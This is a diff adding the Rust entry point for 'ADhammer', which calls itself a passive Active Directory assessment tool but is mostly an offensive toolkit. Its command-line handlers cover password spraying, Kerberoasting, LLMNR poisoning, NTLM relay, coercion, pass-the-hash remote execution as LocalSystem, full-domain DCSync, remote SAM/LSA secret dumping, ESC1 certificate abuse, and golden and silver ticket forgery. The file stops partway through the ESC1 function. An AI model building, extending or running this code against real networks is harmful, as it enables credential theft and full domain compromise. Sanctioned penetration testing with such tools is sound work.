@@ -1,0 +1,2692 @@
+//! ADhammer — passive Active Directory security assessment (PingCastle-class), in Rust.
+//! Pipeline: LDAP collect → build control-path graph → run checks → score → report.
+
+use adhammer_collector::{Collector, LdapConfig};
+use adhammer_graph::ControlGraph;
+use adhammer_report::{Report, RiskConfig};
+use anyhow::{Context, Result};
+use clap::{Parser, Subcommand};
+
+mod interactive;
+mod poison;
+mod session;
+
+#[derive(Parser)]
+#[command(
+    name = "adhammer",
+    version,
+    about = "Passive AD security assessment in Rust"
+)]
+struct Cli {
+    /// Reuse the last saved session (skip setup prompts, go straight to the menu).
+    #[arg(long)]
+    old: bool,
+
+    #[command(subcommand)]
+    cmd: Option<Command>,
+}
+
+#[derive(Subcommand)]
+enum Command {
+    /// Passive audit: LDAP collection → control-path graph → 33 checks → scored report.
+    Scan(ScanArgs),
+    /// Read-only enumeration over RPC (SAMR users, LSAT name↔SID).
+    #[command(subcommand)]
+    Enum(EnumCmd),
+    /// Active attacks: roasting, spraying, LDAP abuse, coercion, RBCD.
+    #[command(subcommand)]
+    Attack(AttackCmd),
+}
+
+#[derive(Subcommand)]
+enum EnumCmd {
+    /// Enumerate domain users over SAMR (SMB named pipe).
+    Samr(SamrArgs),
+    /// Resolve a name to its SID over LSAT (\lsarpc).
+    Lsa(LsaArgs),
+    /// Sweep a network: live hosts, AD ports, and SMB signing (NTLM-relay targets).
+    Net(NetArgs),
+}
+
+#[derive(Parser)]
+struct NetArgs {
+    /// Targets: CIDR (10.0.0.0/24), comma-list (a,b,c), or @file (one host per line)
+    #[arg(long)]
+    targets: String,
+    /// Max concurrent host probes
+    #[arg(long, default_value = "256")]
+    concurrency: usize,
+    /// Per-service checks: FTP anon, SMTP VRFY, DNS version/AXFR, NFS showmount, rsync modules,
+    /// SNMP community, MSSQL/MySQL version+login, RPC/EPM surface, WinRM auth, VNC no-auth, Redis
+    #[arg(long)]
+    deep: bool,
+    /// DNS zone to attempt AXFR against (deep DNS check); e.g. corp.local
+    #[arg(long)]
+    zone: Option<String>,
+    /// SNMP community strings to try (deep, UDP/161); comma-separated
+    #[arg(long, default_value = "public,private")]
+    community: String,
+}
+
+#[derive(Subcommand)]
+enum AttackCmd {
+    /// Kerberos AS-REP roast + Kerberoast (RC4/AES hashcat output).
+    Roast(ScanArgs),
+    /// Kerberos password spray / user enumeration.
+    Spray(SprayArgs),
+    /// LDAP abuse: add-spn / add-member / set-password / write-rbcd.
+    Abuse(AbuseArgs),
+    /// Coerce the DC to authenticate to a listener (PetitPotam / MS-EFSR).
+    Coerce(CoerceArgs),
+    /// RBCD: S4U2Self + S4U2Proxy to impersonate a user to a target service.
+    Rbcd(RbcdArgs),
+    /// Constrained delegation abuse: same S4U2Self+S4U2Proxy chain via a `msDS-AllowedToDelegateTo`
+    /// account with protocol transition (impersonate any user to the allowed service).
+    Constrained(RbcdArgs),
+    /// Ask-TGT: get a TGT with a password and write a reusable ccache (Kerberos `-k` workflows).
+    Asktgt(AsktgtArgs),
+    /// DCSync: replicate a target's secrets via DRSUAPI over a sealed RPC channel.
+    Dcsync(DcsyncArgs),
+    /// Capture NetNTLMv2 from coerced/poisoned victims (SMB listener → hashcat -m 5600).
+    Capture(CaptureArgs),
+    /// Poison LLMNR + NBT-NS name resolution to lure victims to us (pair with `capture`).
+    Poison(PoisonArgs),
+    /// NTLM relay: SMB victim (coerced/poisoned) → LDAP as the victim → write a Shadow Credential.
+    Relay(RelayArgs),
+    /// Remote command execution as LocalSystem over SVCCTL (psexec-style service create/run/delete).
+    Exec(ExecArgs),
+    /// Remote command execution as LocalSystem over TSCH (atexec-style scheduled task).
+    Atexec(ExecArgs),
+    /// Local secretsdump: reg-save SYSTEM+SAM, pull over C$, decrypt local NT hashes offline.
+    Secretsdump(SecretsdumpArgs),
+    /// Read a gMSA managed password over LDAP → NT hash (for accounts you may retrieve).
+    Gmsa(GmsaArgs),
+    /// AD CS ESC1: enroll a client-auth cert with a spoofed UPN SAN on a vuln template.
+    Esc1(Esc1Args),
+    /// Golden ticket: forge a TGT for any identity with the krbtgt AES256 key (from `dcsync krbtgt`).
+    Golden(GoldenArgs),
+    /// Silver ticket: forge a service ticket (TGS) for an SPN with the service account's AES256 key.
+    Silver(SilverArgs),
+    /// Pass-the-ticket: forge golden/silver → get a service ticket → Kerberos AP-REQ over SMB →
+    /// authenticate (and optionally run a command as the impersonated identity).
+    Pth(PthArgs),
+}
+
+#[derive(Parser)]
+struct PthArgs {
+    /// Target SMB host or IP (usually the DC).
+    #[arg(long)]
+    host: String,
+    /// KDC host or IP (for golden → TGS-REQ). Defaults to --host.
+    #[arg(long)]
+    kdc: Option<String>,
+    /// Kerberos realm (e.g. CORP.LOCAL).
+    #[arg(long)]
+    realm: String,
+    /// Domain SID (S-1-5-21-a-b-c).
+    #[arg(long)]
+    domain_sid: String,
+    /// Golden mode: krbtgt AES256 key (64 hex). Mutually exclusive with --service-aes256.
+    #[arg(long)]
+    krbtgt_aes256: Option<String>,
+    /// Silver mode: target service account AES256 key (64 hex).
+    #[arg(long)]
+    service_aes256: Option<String>,
+    /// Target SPN for the service ticket (default cifs/<host>).
+    #[arg(long)]
+    spn: Option<String>,
+    /// Identity to impersonate (default Administrator).
+    #[arg(long, default_value = "Administrator")]
+    user: String,
+    /// RID of the impersonated account (default 500).
+    #[arg(long, default_value_t = 500)]
+    rid: u32,
+    /// Group RIDs to embed.
+    #[arg(long, value_delimiter = ',', default_value = "513,512,520,518,519")]
+    groups: Vec<u32>,
+    /// Optional command to run as LocalSystem over the Kerberos-authenticated session.
+    #[arg(long)]
+    command: Option<String>,
+}
+
+#[derive(Parser)]
+struct SilverArgs {
+    /// Kerberos realm (e.g. CORP.LOCAL).
+    #[arg(long)]
+    realm: String,
+    /// Service account AES256 key (64 hex) — from `dcsync` of the machine$/service account.
+    #[arg(long)]
+    service_aes256: String,
+    /// Target SPN (e.g. cifs/dc01.corp.local).
+    #[arg(long)]
+    spn: String,
+    /// Domain SID (S-1-5-21-a-b-c).
+    #[arg(long)]
+    domain_sid: String,
+    /// Identity to impersonate (default Administrator).
+    #[arg(long, default_value = "Administrator")]
+    user: String,
+    /// RID of the impersonated account (default 500).
+    #[arg(long, default_value_t = 500)]
+    rid: u32,
+    /// Group RIDs to embed (default: Users + Domain/Schema/Enterprise Admins + GPO Creators).
+    #[arg(long, value_delimiter = ',', default_value = "513,512,520,518,519")]
+    groups: Vec<u32>,
+    /// Write the forged service ticket to this ccache path.
+    #[arg(long)]
+    out: Option<String>,
+}
+
+#[derive(Parser)]
+struct GoldenArgs {
+    /// KDC host or IP.
+    #[arg(long)]
+    kdc: String,
+    /// Kerberos realm (e.g. CORP.LOCAL).
+    #[arg(long)]
+    realm: String,
+    /// krbtgt AES256 key (64 hex) — from `attack dcsync --target krbtgt`.
+    #[arg(long)]
+    krbtgt_aes256: String,
+    /// Domain SID (S-1-5-21-a-b-c).
+    #[arg(long)]
+    domain_sid: String,
+    /// Identity to impersonate (default Administrator).
+    #[arg(long, default_value = "Administrator")]
+    user: String,
+    /// RID of the impersonated account (default 500).
+    #[arg(long, default_value_t = 500)]
+    rid: u32,
+    /// Group RIDs to embed (default: Users + Domain/Schema/Enterprise Admins + GPO Creators).
+    #[arg(long, value_delimiter = ',', default_value = "513,512,520,518,519")]
+    groups: Vec<u32>,
+    /// Write the forged TGT to this ccache path.
+    #[arg(long)]
+    out: Option<String>,
+    /// Optional live acceptance proof: request a service ticket for this SPN with the forged TGT.
+    #[arg(long)]
+    verify_spn: Option<String>,
+}
+
+#[derive(Parser)]
+struct Esc1Args {
+    /// Target host or IP (the CA / DC)
+    #[arg(long)]
+    host: String,
+    #[arg(long)]
+    domain: String,
+    #[arg(long)]
+    user: String,
+    #[arg(long)]
+    password: String,
+    /// CA name, e.g. corp-CA
+    #[arg(long)]
+    ca: String,
+    /// Vulnerable template name (enrollee-supplies-subject), e.g. VulnUser
+    #[arg(long)]
+    template: String,
+    /// UPN to impersonate via the SAN, e.g. Administrator@corp.local
+    #[arg(long)]
+    upn: String,
+    /// Output path for the issued cert (DER); the private key is written alongside as .key.pem
+    #[arg(long, default_value = "esc1.crt")]
+    out: String,
+    /// After issuing, PKINIT with the cert to obtain a TGT as the impersonated user (→ .ccache)
+    #[arg(long)]
+    pkinit: bool,
+    /// KDC host[:port] for --pkinit (defaults to --host)
+    #[arg(long)]
+    kdc: Option<String>,
+}
+
+#[derive(Parser)]
+struct GmsaArgs {
+    /// LDAP URL (LDAPS required — the managed password is only returned over a sealed channel)
+    #[arg(long)]
+    url: String,
+    #[arg(long)]
+    user: String,
+    #[arg(long)]
+    password: String,
+    #[arg(long)]
+    insecure: bool,
+    /// gMSA sAMAccountName (e.g. gmsa_web$)
+    #[arg(long)]
+    target: String,
+}
+
+#[derive(Parser)]
+struct SecretsdumpArgs {
+    /// Target host or IP
+    #[arg(long)]
+    host: String,
+    /// NetBIOS or DNS domain
+    #[arg(long)]
+    domain: String,
+    /// Username (needs local admin on the target)
+    #[arg(long)]
+    user: String,
+    #[arg(long, default_value = "")]
+    password: String,
+    /// Pass-the-hash: NT hash (32 hex, or LM:NT) instead of --password
+    #[arg(long)]
+    nt_hash: Option<String>,
+}
+
+#[derive(Parser)]
+struct ExecArgs {
+    /// Target host or IP
+    #[arg(long)]
+    host: String,
+    /// NetBIOS or DNS domain
+    #[arg(long)]
+    domain: String,
+    /// Username (needs local admin on the target for SVCCTL create)
+    #[arg(long)]
+    user: String,
+    #[arg(long, default_value = "")]
+    password: String,
+    /// Pass-the-hash: NT hash (32 hex, or LM:NT) instead of --password
+    #[arg(long)]
+    nt_hash: Option<String>,
+    /// Command to run (executed as `cmd.exe /Q /c <command>` under LocalSystem)
+    #[arg(long)]
+    command: String,
+}
+
+#[derive(Parser)]
+struct RelayArgs {
+    /// SMB address to receive the coerced/poisoned victim on
+    #[arg(long, default_value = "0.0.0.0:445")]
+    listen: String,
+    /// Target DC to relay the victim's auth to (LDAP :389)
+    #[arg(long)]
+    target_dc: String,
+    /// AD DNS domain, for the base DN (e.g. corp.local)
+    #[arg(long)]
+    realm: String,
+    /// Object (sAMAccountName) to write msDS-KeyCredentialLink on, as the relayed victim
+    #[arg(long)]
+    target_object: String,
+}
+
+#[derive(Parser)]
+struct PoisonArgs {
+    /// Our IP to hand out for every poisoned name (where `attack capture` listens)
+    #[arg(long)]
+    spoof_ip: std::net::Ipv4Addr,
+}
+
+#[derive(Parser)]
+struct CaptureArgs {
+    /// Address to listen on, e.g. 0.0.0.0:445 (needs privilege for 445)
+    #[arg(long, default_value = "0.0.0.0:445")]
+    listen: String,
+}
+
+#[derive(Parser)]
+struct DcsyncArgs {
+    /// DC host or IP
+    #[arg(long)]
+    host: String,
+    /// NetBIOS domain, e.g. CORP
+    #[arg(long)]
+    domain: String,
+    /// Username (needs replication rights for a real sync)
+    #[arg(long)]
+    user: String,
+    #[arg(long)]
+    password: String,
+    /// Target account to replicate (sAMAccountName or DN); omit to just test the bind
+    #[arg(long)]
+    target: Option<String>,
+    /// Replicate ALL domain accounts (enumerate via SAMR, then DCSync each) — full secretsdump
+    #[arg(long)]
+    all: bool,
+}
+
+#[derive(Parser)]
+struct AsktgtArgs {
+    /// Username (sAMAccountName)
+    #[arg(long)]
+    user: String,
+    /// Kerberos realm, e.g. CORP.LOCAL
+    #[arg(long)]
+    realm: String,
+    /// KDC host[:port]
+    #[arg(long)]
+    kdc: String,
+    #[arg(long)]
+    password: String,
+    /// Output ccache path (defaults to <user>.ccache)
+    #[arg(long)]
+    out: Option<String>,
+}
+
+#[derive(Parser)]
+struct RbcdArgs {
+    #[arg(long)]
+    kdc: String,
+    #[arg(long)]
+    realm: String,
+    /// Controlled account (the RBCD trustee) sAMAccountName
+    #[arg(long)]
+    account: String,
+    /// Controlled account password
+    #[arg(long)]
+    account_password: String,
+    /// User to impersonate, e.g. Administrator
+    #[arg(long)]
+    impersonate: String,
+    /// Target service SPN, e.g. cifs/dc01.corp.local
+    #[arg(long)]
+    target_spn: String,
+}
+
+#[derive(Parser)]
+struct CoerceArgs {
+    #[arg(long)]
+    host: String,
+    #[arg(long)]
+    domain: String,
+    #[arg(long)]
+    user: String,
+    #[arg(long)]
+    password: String,
+    /// Attacker host the DC should authenticate to (UNC target)
+    #[arg(long)]
+    listener: String,
+    /// Coercion vector: lsarpc / efsrpc (PetitPotam, MS-EFSR) or spoolss (PrinterBug, MS-RPRN)
+    #[arg(long, default_value = "lsarpc")]
+    pipe: String,
+    /// PrinterBug server name to open (defaults to --host; modern spoolers want the hostname/FQDN, not an IP)
+    #[arg(long)]
+    target: Option<String>,
+}
+
+#[derive(Parser)]
+struct AbuseArgs {
+    /// LDAP URL (required for the LDAP-write actions; unused by `pkinit`)
+    #[arg(long)]
+    url: Option<String>,
+    #[arg(long)]
+    user: Option<String>,
+    #[arg(long)]
+    password: Option<String>,
+    #[arg(long)]
+    insecure: bool,
+    /// add-spn | add-member | set-password | add-keycred | write-rbcd | pkinit
+    #[arg(long)]
+    action: String,
+    /// Target sAMAccountName (the object to modify; the group for add-member; the account
+    /// to authenticate as for `pkinit`)
+    #[arg(long)]
+    target: String,
+    /// Value: the SPN, member sAMAccountName, new password, RBCD trustee, or (for `pkinit`)
+    /// the key .pem path — defaults to `<target>.key.pem`
+    #[arg(long, default_value = "")]
+    value: String,
+    /// Kerberos realm (pkinit); also the AD DNS domain for --ldap389 base DN
+    #[arg(long)]
+    realm: Option<String>,
+    /// KDC host[:port] (pkinit)
+    #[arg(long)]
+    kdc: Option<String>,
+    /// add-keycred over raw LDAP-389 + NTLM SASL bind (no LDAPS) — needs --host + --realm
+    #[arg(long)]
+    ldap389: bool,
+    /// DC host for --ldap389
+    #[arg(long)]
+    host: Option<String>,
+}
+
+#[derive(Parser)]
+struct SprayArgs {
+    /// KDC host[:port]
+    #[arg(long)]
+    kdc: String,
+    /// Kerberos realm, e.g. CORP.LOCAL
+    #[arg(long)]
+    realm: String,
+    /// Users: comma-separated list, or @file with one per line
+    #[arg(long)]
+    users: String,
+    /// Single password to spray across all users
+    #[arg(long)]
+    password: String,
+}
+
+#[derive(Parser)]
+struct LsaArgs {
+    #[arg(long)]
+    host: String,
+    #[arg(long)]
+    domain: String,
+    #[arg(long)]
+    user: String,
+    #[arg(long, default_value = "")]
+    password: String,
+    /// Pass-the-hash: NT hash (32 hex, or LM:NT) instead of --password
+    #[arg(long)]
+    nt_hash: Option<String>,
+    /// Name to resolve to a SID, e.g. Administrator
+    #[arg(long)]
+    name: String,
+}
+
+#[derive(Parser)]
+struct SamrArgs {
+    /// DC host or IP
+    #[arg(long)]
+    host: String,
+    /// NetBIOS domain, e.g. CORP
+    #[arg(long)]
+    domain: String,
+    /// Username (sAMAccountName)
+    #[arg(long)]
+    user: String,
+    /// Password
+    #[arg(long, default_value = "")]
+    password: String,
+    /// Pass-the-hash: NT hash (32 hex, or LM:NT) instead of --password
+    #[arg(long)]
+    nt_hash: Option<String>,
+}
+
+#[derive(Parser)]
+struct ScanArgs {
+    /// LDAP URL, e.g. ldap://dc.corp.local:389 or ldaps://dc.corp.local:636
+    #[arg(long)]
+    url: String,
+    /// Bind identity: user@realm, DOMAIN\\user, or full DN
+    #[arg(long)]
+    user: String,
+    /// Bind password
+    #[arg(long)]
+    password: String,
+    /// Base DN (defaults to RootDSE defaultNamingContext)
+    #[arg(long)]
+    base_dn: Option<String>,
+    /// Output format for `scan`
+    #[arg(long, default_value = "json")]
+    format: String,
+    /// KDC host[:port] for `roast` to actually AS-REP roast (omit = list candidates only)
+    #[arg(long)]
+    kdc: Option<String>,
+    /// SYSVOL path for `scan` to hunt GPP cpasswords, e.g. \\corp.local\SYSVOL
+    #[arg(long)]
+    sysvol: Option<String>,
+    /// Skip TLS certificate verification (LDAPS against a self-signed / lab DC)
+    #[arg(long)]
+    insecure: bool,
+    /// SASL GSSAPI bind (signed LDAP over 389 via ambient Kerberos; needs `--features gssapi`)
+    #[arg(long)]
+    gssapi: bool,
+    /// Also export the collected domain as a BloodHound .zip at this path (SharpHound JSON)
+    #[arg(long)]
+    bloodhound: Option<String>,
+}
+
+#[tokio::main]
+async fn main() -> Result<()> {
+    tracing_subscriber::fmt().with_target(false).init();
+    let cli = Cli::parse();
+
+    match cli.cmd {
+        None => interactive::run(cli.old).await,
+        Some(cmd) => dispatch(cmd).await,
+    }
+}
+
+async fn dispatch(cmd: Command) -> Result<()> {
+    match cmd {
+        Command::Scan(a) => scan(a).await,
+        Command::Enum(EnumCmd::Samr(a)) => samr(a).await,
+        Command::Enum(EnumCmd::Lsa(a)) => lsa(a).await,
+        Command::Enum(EnumCmd::Net(a)) => netenum(a).await,
+        Command::Attack(AttackCmd::Roast(a)) => roast(a).await,
+        Command::Attack(AttackCmd::Spray(a)) => spray(a).await,
+        Command::Attack(AttackCmd::Abuse(a)) => abuse(a).await,
+        Command::Attack(AttackCmd::Coerce(a)) => coerce(a).await,
+        Command::Attack(AttackCmd::Rbcd(a)) => rbcd(a).await,
+        Command::Attack(AttackCmd::Constrained(a)) => rbcd(a).await,
+        Command::Attack(AttackCmd::Asktgt(a)) => asktgt(a).await,
+        Command::Attack(AttackCmd::Dcsync(a)) => dcsync(a).await,
+        Command::Attack(AttackCmd::Capture(a)) => adhammer_smb::server::capture(&a.listen)
+            .await
+            .map_err(Into::into),
+        Command::Attack(AttackCmd::Poison(a)) => poison::poison(a.spoof_ip).await,
+        Command::Attack(AttackCmd::Relay(a)) => relay(a).await,
+        Command::Attack(AttackCmd::Exec(a)) => exec_cmd(a).await,
+        Command::Attack(AttackCmd::Atexec(a)) => atexec_cmd(a).await,
+        Command::Attack(AttackCmd::Secretsdump(a)) => secretsdump(a).await,
+        Command::Attack(AttackCmd::Gmsa(a)) => gmsa(a).await,
+        Command::Attack(AttackCmd::Esc1(a)) => esc1(a).await,
+        Command::Attack(AttackCmd::Golden(a)) => golden(a).await,
+        Command::Attack(AttackCmd::Silver(a)) => silver(a).await,
+        Command::Attack(AttackCmd::Pth(a)) => pth(a).await,
+    }
+}
+
+/// Full RBCD attack: S4U2Self + S4U2Proxy to obtain an impersonation ticket to the target.
+async fn rbcd(a: RbcdArgs) -> Result<()> {
+    let etype = adhammer_kerberos::rbcd_impersonate(
+        &a.account,
+        &a.account_password,
+        &a.realm,
+        &a.kdc,
+        &a.impersonate,
+        &a.target_spn,
+    )
+    .await?;
+    println!(
+        "[+] got service ticket for {} as {} (enc-part etype {etype})",
+        a.target_spn, a.impersonate
+    );
+    println!("    RBCD chain succeeded — impersonation ticket obtained.");
+    Ok(())
+}
+
+/// Ask-TGT: obtain a TGT with a password and write a reusable MIT ccache.
+async fn asktgt(a: AsktgtArgs) -> Result<()> {
+    let ccache = adhammer_kerberos::asktgt(&a.user, &a.realm, &a.kdc, &a.password).await?;
+    let out = a.out.unwrap_or_else(|| format!("{}.ccache", a.user));
+    std::fs::write(&out, &ccache)?;
+    println!(
+        "[+] TGT obtained for {} → {out} ({} bytes)",
+        a.user,
+        ccache.len()
+    );
+    println!("    export KRB5CCNAME={out}  (use with Kerberos-aware tooling)");
+    Ok(())
+}
+
+/// DCSync: bind DRSUAPI over a sign+sealed channel, then replicate a target's secrets.
+async fn dcsync(a: DcsyncArgs) -> Result<()> {
+    use adhammer_dcerpc::drsuapi::DrsSession;
+
+    if a.all {
+        return dcsync_all(&a).await;
+    }
+    let mut sess = DrsSession::bind(&a.host, &a.domain, &a.user, &a.password).await?;
+    match a.target {
+        None => {
+            let handle_hex: String = sess.handle().iter().map(|b| format!("{b:02x}")).collect();
+            println!("[+] DRSBind OK — sealed replication handle {handle_hex} (no --target: bind-only check)");
+        }
+        Some(t) => {
+            let (rid, nt, kerb) = sess.dcsync(&a.domain, &t).await?;
+            let nthex: String = nt.iter().map(|b| format!("{b:02x}")).collect();
+            // secretsdump format: user:rid:lmhash:nthash:::  (LM is the empty-string hash)
+            println!(
+                "{}:{}:aad3b435b51404eeaad3b435b51404ee:{}:::",
+                t, rid, nthex
+            );
+            // Kerberos keys (secretsdump-style): user:etype:hexkey
+            for k in &kerb {
+                println!("{}:{}:{}", t, k.etype_name(), hex::encode(&k.key));
+            }
+        }
+    }
+    Ok(())
+}
+
+/// Full-domain DCSync: enumerate every account over SAMR, then replicate + decrypt each — the
+/// whole-domain NTDS dump (secretsdump `@dc`). Reuses SAMR enumeration and per-account DCSync
+/// (which now reassembles multi-fragment replies, so large/computer accounts work too).
+async fn dcsync_all(a: &DcsyncArgs) -> Result<()> {
+    use adhammer_dcerpc::drsuapi::DrsSession;
+    use adhammer_dcerpc::samr::SamrClient;
+    use adhammer_smb::SmbClient;
+
+    // 1. enumerate accounts via SAMR-over-SMB.
+    let mut smb = SmbClient::connect(&a.host).await?;
+    smb.login(&a.host, &a.domain, &a.user, &a.password).await?;
+    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
+    let pipe = smb.open_pipe("samr").await?;
+    let mut samr = SamrClient::bind(&mut smb, pipe).await?;
+    let users = samr.enumerate_all_users(&format!("\\\\{}", a.host)).await?;
+    eprintln!(
+        "[+] {} accounts enumerated; replicating secrets…",
+        users.len()
+    );
+
+    // 2. DCSync each over one sealed DRSUAPI session.
+    let mut sess = DrsSession::bind(&a.host, &a.domain, &a.user, &a.password).await?;
+    let (mut ok, mut fail) = (0u32, 0u32);
+    for (_rid, name) in &users {
+        match sess.dcsync(&a.domain, name).await {
+            Ok((rid, nt, kerb)) => {
+                let nthex: String = nt.iter().map(|b| format!("{b:02x}")).collect();
+                println!(
+                    "{}:{}:aad3b435b51404eeaad3b435b51404ee:{}:::",
+                    name, rid, nthex
+                );
+                for k in &kerb {
+                    println!("{}:{}:{}", name, k.etype_name(), hex::encode(&k.key));
+                }
+                ok += 1;
+            }
+            Err(e) => {
+                tracing::warn!("dcsync {name} failed: {e}");
+                fail += 1;
+            }
+        }
+    }
+    eprintln!("[+] full-domain DCSync complete: {ok} dumped, {fail} failed");
+    Ok(())
+}
+
+/// Remote code execution over SVCCTL: create a LocalSystem service running the command, start
+/// it, delete it. Blind (no output) — pair with a listener or redirect to a share for results.
+/// Parse an NT hash from `--nt-hash` (accepts bare 32-hex or `LM:NT`).
+fn parse_nt_hash(s: &str) -> Result<[u8; 16]> {
+    let hex_str = s.rsplit(':').next().unwrap_or(s).trim();
+    let raw = hex::decode(hex_str).context("--nt-hash must be hex")?;
+    anyhow::ensure!(
+        raw.len() == 16,
+        "--nt-hash must be a 32-hex NT hash (got {} bytes)",
+        raw.len()
+    );
+    Ok(raw.try_into().unwrap())
+}
+
+/// SMB login with either a password or an NT hash (pass-the-hash).
+async fn smb_login(
+    smb: &mut adhammer_smb::SmbClient,
+    host: &str,
+    domain: &str,
+    user: &str,
+    password: &str,
+    nt_hash: &Option<String>,
+) -> Result<()> {
+    match nt_hash {
+        Some(h) => {
+            let nt = parse_nt_hash(h)?;
+            smb.login_hash(host, domain, user, &nt).await?;
+        }
+        None => {
+            anyhow::ensure!(!password.is_empty(), "provide --password or --nt-hash");
+            smb.login(host, domain, user, password).await?;
+        }
+    }
+    Ok(())
+}
+
+async fn exec_cmd(a: ExecArgs) -> Result<()> {
+    use adhammer_smb::SmbClient;
+    let mut smb = SmbClient::connect(&a.host).await?;
+    smb_login(
+        &mut smb,
+        &a.host,
+        &a.domain,
+        &a.user,
+        &a.password,
+        &a.nt_hash,
+    )
+    .await?;
+    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
+    let r = adhammer_dcerpc::svcctl::exec(&mut smb, &a.host, &a.command).await?;
+    let clean = if r.cleaned {
+        "service cleaned up"
+    } else {
+        "SERVICE NOT DELETED"
+    };
+    if r.ran {
+        println!(
+            "[+] executed as LocalSystem (service '{}', start win32 {}); {clean}",
+            r.service, r.start_win32
+        );
+    } else {
+        println!("[-] service '{}' created but start returned win32 {} (command may not have run); {clean}", r.service, r.start_win32);
+    }
+    match r.output {
+        Some(o) if !o.is_empty() => println!("\n{o}"),
+        Some(_) => println!("[*] command produced no output"),
+        None => println!("[*] output not captured (see warnings; command may still have run)"),
+    }
+    Ok(())
+}
+
+/// atexec: remote code execution as LocalSystem via a scheduled task (MS-TSCH), with output
+/// captured over C$. Alternative to `exec` (SVCCTL) — different host telemetry.
+async fn atexec_cmd(a: ExecArgs) -> Result<()> {
+    use adhammer_smb::SmbClient;
+    let mut smb = SmbClient::connect(&a.host).await?;
+    smb_login(
+        &mut smb,
+        &a.host,
+        &a.domain,
+        &a.user,
+        &a.password,
+        &a.nt_hash,
+    )
+    .await?;
+
+    let tag = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .map(|d| d.subsec_nanos())
+        .unwrap_or(0);
+    let out_rel = format!("Windows\\Temp\\ADhat{tag:08x}.out");
+    let full = format!("{} > C:\\{out_rel} 2>&1", a.command);
+
+    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
+    let (path, run_hr) =
+        adhammer_dcerpc::tsch::atexec(&mut smb, &full, &a.domain, &a.user, &a.password, &a.host)
+            .await?;
+    println!("[+] scheduled task {path} registered + run as LocalSystem (run HRESULT 0x{run_hr:08x}); deleted");
+
+    smb.tree_connect(&format!("\\\\{}\\C$", a.host)).await?;
+    match smb.read_file_delete(&out_rel).await {
+        Ok(b) if !b.is_empty() => println!(
+            "\n{}",
+            String::from_utf8_lossy(&b).replace('\r', "").trim_end()
+        ),
+        Ok(_) => println!("[*] command produced no output"),
+        Err(e) => println!("[*] output not captured: {e}"),
+    }
+    Ok(())
+}
+
+/// Local secretsdump: run `reg save` for SYSTEM + SAM as LocalSystem, pull the hives over C$,
+/// then decrypt the local account NT hashes offline (bootkey → SAM key → per-user).
+async fn secretsdump(a: SecretsdumpArgs) -> Result<()> {
+    use adhammer_smb::SmbClient;
+    let mut smb = SmbClient::connect(&a.host).await?;
+    smb_login(
+        &mut smb,
+        &a.host,
+        &a.domain,
+        &a.user,
+        &a.password,
+        &a.nt_hash,
+    )
+    .await?;
+
+    // reg-save the three hives (SeBackupPrivilege via the LocalSystem service context).
+    let sys_rel = "Windows\\Temp\\ADh_sys.tmp";
+    let sam_rel = "Windows\\Temp\\ADh_sam.tmp";
+    let sec_rel = "Windows\\Temp\\ADh_sec.tmp";
+    for (hive, rel) in [("SYSTEM", sys_rel), ("SAM", sam_rel), ("SECURITY", sec_rel)] {
+        smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
+        let cmd = format!("reg save HKLM\\{hive} C:\\{rel} /y");
+        let ret = adhammer_dcerpc::svcctl::run(&mut smb, &cmd).await?;
+        tracing::info!("reg save {hive}: SCM start win32 {ret}");
+    }
+
+    // Pull the hives back over C$ (delete-on-close), then decrypt offline.
+    smb.tree_connect(&format!("\\\\{}\\C$", a.host)).await?;
+    let system = smb
+        .read_file_delete(sys_rel)
+        .await
+        .context("read SYSTEM hive over C$")?;
+    let sam = smb
+        .read_file_delete(sam_rel)
+        .await
+        .context("read SAM hive over C$")?;
+    let security = smb
+        .read_file_delete(sec_rel)
+        .await
+        .context("read SECURITY hive over C$")?;
+    eprintln!(
+        "[+] hives: SYSTEM {} B, SAM {} B, SECURITY {} B",
+        system.len(),
+        sam.len(),
+        security.len()
+    );
+
+    // --- SAM: local account NT hashes ---
+    match adhammer_secrets::local_dump(&system, &sam) {
+        Ok(accounts) => {
+            eprintln!("[+] {} local account(s):", accounts.len());
+            for acct in accounts {
+                println!("{}", acct.secretsdump_line());
+            }
+        }
+        Err(e) => eprintln!("[-] SAM decrypt failed: {e}"),
+    }
+
+    // --- LSA secrets + cached domain credentials (DCC2) ---
+    match adhammer_secrets::local_lsa(&system, &security) {
+        Ok(dump) => {
+            eprintln!("[+] {} LSA secret(s):", dump.secrets.len());
+            for s in &dump.secrets {
+                if s.name.eq_ignore_ascii_case("$MACHINE.ACC") {
+                    let nt: String = adhammer_ntlm::md4(&s.secret)
+                        .iter()
+                        .map(|b| format!("{b:02x}"))
+                        .collect();
+                    println!("$MACHINE.ACC:aad3b435b51404eeaad3b435b51404ee:{nt}:::");
+                } else {
+                    print_lsa_secret(&s.name, &s.secret);
+                }
+            }
+            if !dump.cached.is_empty() {
+                eprintln!(
+                    "[+] {} cached domain logon(s) (hashcat -m 2100):",
+                    dump.cached.len()
+                );
+                for c in &dump.cached {
+                    println!("{}", c.dcc2_line());
+                }
+            }
+        }
+        Err(e) => eprintln!("[-] LSA decrypt failed: {e}"),
+    }
+    Ok(())
+}
+
+/// Print an LSA secret readably: a printable UTF-16 string, else hex.
+fn print_lsa_secret(name: &str, secret: &[u8]) {
+    // Render as text only if it's a clean printable-ASCII UTF-16 string (e.g. DefaultPassword);
+    // binary key material (NL$KM, DPAPI_SYSTEM) prints as hex.
+    let units: Vec<u16> = secret
+        .chunks_exact(2)
+        .map(|c| u16::from_le_bytes([c[0], c[1]]))
+        .take_while(|&u| u != 0)
+        .collect();
+    let printable = !units.is_empty() && units.iter().all(|&u| (0x20..0x7f).contains(&u));
+    if printable {
+        println!("{name}:{}", String::from_utf16_lossy(&units));
+    } else {
+        println!("{name}:{}", hex::encode(secret));
+    }
+}
+
+/// AD CS ESC1: build a PKCS#10 CSR whose SAN is the target UPN, enroll it on an
+/// enrollee-supplies-subject template via MS-ICPR, and save the issued client-auth cert + key.
+/// The cert can then PKINIT as the impersonated principal.
+async fn esc1(a: Esc1Args) -> Result<()> {
+    use adhammer_smb::SmbClient;
+
+    let subject = a.upn.split('@').next().unwrap_or("adhammer");
+    let csr = adhammer_kerberos::csr::build_csr(subject, Some(&a.upn))?;
+    eprintln!("[*] CSR built (subject CN={subject}, SAN upn={})", a.upn);
+
+    let mut smb = SmbClient::connect(&a.host).await?;
